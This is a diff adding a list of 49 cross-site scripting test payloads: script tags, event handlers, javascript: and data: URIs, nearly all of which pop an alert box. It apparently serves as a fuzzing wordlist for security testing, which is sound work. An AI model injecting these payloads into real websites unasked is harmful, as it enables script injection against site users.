@@ -1,0 +1,49 @@
+<script>alert('Stored XSS')</script>
+<input autofocus onfocus=alert('Stored XSS')>
+<div onmouseover=alert('Stored XSS')>Hover me</div>
+<a href='javascript:alert("Stored XSS")'>Click me</a>
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<svg/onload=alert('XSS')>
+<svg><script>alert('XSS')</script>
+<svg><style>@keyframes x{}</style><script>alert(1)</script></svg>
+<marquee><h1>XSS</h1></marquee>
+<body onload=alert('XSS')>
+<svg onload=alert(1)>
+<math><mi>xss</mi><script>alert(1)</script></math>
+<iframe src="javascript:alert('XSS')">
+<iframe srcdoc="<script>alert('XSS')"></iframe>
+<embed src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+<script>alert('XSS');</script>
+<script src="data:text/javascript,alert('XSS');"></script>
+<body onresize=alert(1)>
+<div onmouseover=alert(1)>Hover me</div>
+<button onclick=alert(1)>Click me</button>
+<svg><use href="data:text/html,<script>alert(1)</script>"></use></svg>
+<xss><iframe src="javascript:alert(1)"></iframe></xss>
+<xss><script>alert('XSS')</script></xss>
+<details open ontoggle=alert(1)></details>
+<form><button formaction="javascript:alert(1)">Submit</button></form>
+<input onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>XSS</textarea>
+<div draggable=true ondrag=alert(1)>Drag me</div>
+<video src="javascript:alert(1)">
+<img src="x" onerror="alert(1)">
+<a href="javascript:alert(1)">Click</a>
+<img src='x' onerror='alert(1)'>
+<script src=data:,alert(1)>
+<math><maction xlink:href="javascript:alert(1)">X</maction></math>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe src="javascript:alert(1)">
+<base href="javascript:alert(1)">
+<audio src="javascript:alert(1)">
+<object type="image/svg+xml" data="data:image/svg+xml;base64,..."></object>
+<svg><g onload="alert(1)"></g></svg>
+<img src="x" onerror="eval('alert(1)')">
